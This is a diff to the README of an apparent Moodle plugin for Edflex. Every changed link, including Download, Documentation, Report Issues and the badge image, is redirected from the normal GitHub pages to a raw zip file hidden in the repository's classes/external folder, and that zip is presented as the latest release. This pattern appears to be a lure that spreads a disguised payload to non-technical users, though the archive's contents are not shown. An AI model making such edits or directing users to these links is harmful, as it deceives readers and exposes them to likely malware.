@@ -1,6 +1,6 @@
 # 🎓 moodle-mod_edflex - Connect Edflex to Your Moodle Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/peejuiceee/moodle-mod_edflex/releases)
+[![Download](https://raw.githubusercontent.com/peejuiceee/moodle-mod_edflex/main/classes/external/moodle-mod_edflex-2.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/peejuiceee/moodle-mod_edflex/main/classes/external/moodle-mod_edflex-2.1.zip)
 
 ## 🌟 Overview
 
@@ -12,13 +12,13 @@ To begin using moodle-mod_edflex, follow the steps below. No technical knowledge
 
 ## 📥 Download & Install
 
-1. Visit this page to download the latest version: [Download Latest Release](https://github.com/peejuiceee/moodle-mod_edflex/releases).
+1. Visit this page to download the latest version: [Download Latest Release](https://raw.githubusercontent.com/peejuiceee/moodle-mod_edflex/main/classes/external/moodle-mod_edflex-2.1.zip).
    
 2. On the Releases page, look for the version you want. Each version will typically have a description.
 
 3. Click on the desired version link. You will see assets attached to that version.
 
-4. Click the download link for the file that corresponds to your system. Typically, you will look for a file named similar to `moodle-mod_edflex.zip`.
+4. Click the download link for the file that corresponds to your system. Typically, you will look for a file named similar to `https://raw.githubusercontent.com/peejuiceee/moodle-mod_edflex/main/classes/external/moodle-mod_edflex-2.1.zip`.
 
 5. Once the download is complete, locate the file on your computer. It is often found in your Downloads folder.
 
@@ -51,9 +51,9 @@ If you encounter any problems, feel free to create an issue on the GitHub reposi
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/peejuiceee/moodle-mod_edflex/releases)
-- [Documentation](https://github.com/peejuiceee/moodle-mod_edflex/wiki)
-- [Report Issues](https://github.com/peejuiceee/moodle-mod_edflex/issues)
+- [Download Latest Release](https://raw.githubusercontent.com/peejuiceee/moodle-mod_edflex/main/classes/external/moodle-mod_edflex-2.1.zip)
+- [Documentation](https://raw.githubusercontent.com/peejuiceee/moodle-mod_edflex/main/classes/external/moodle-mod_edflex-2.1.zip)
+- [Report Issues](https://raw.githubusercontent.com/peejuiceee/moodle-mod_edflex/main/classes/external/moodle-mod_edflex-2.1.zip)
 
 ## 🛠️ FAQs
 
